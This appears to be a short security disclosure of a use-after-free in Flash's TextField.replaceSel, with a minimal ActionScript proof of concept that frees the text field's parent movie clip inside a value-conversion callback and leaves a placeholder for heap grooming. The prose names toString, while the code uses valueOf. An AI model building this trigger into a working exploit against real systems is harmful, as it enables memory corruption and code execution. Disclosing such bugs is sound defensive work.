 
There is a use-after-free in TextField.replaceSel. If the string parameter of the method is set to an object with toString defined, this method can delete the TextField&#039;s parent, leading to a use-after-free.
 
A minimal PoC is as follows:
 
var mc = this.createEmptyMovieClip("mc", 101);
var tf = mc.createTextField("tf", 102, 1, 1, 100, 100);
tf.replaceSel({valueOf : func});
 
function func(){
 
    mc.removeMovieClip();
 
        // Fix heap here
 
    return "text";
     
    }
 
A sample swf and fla are attached.
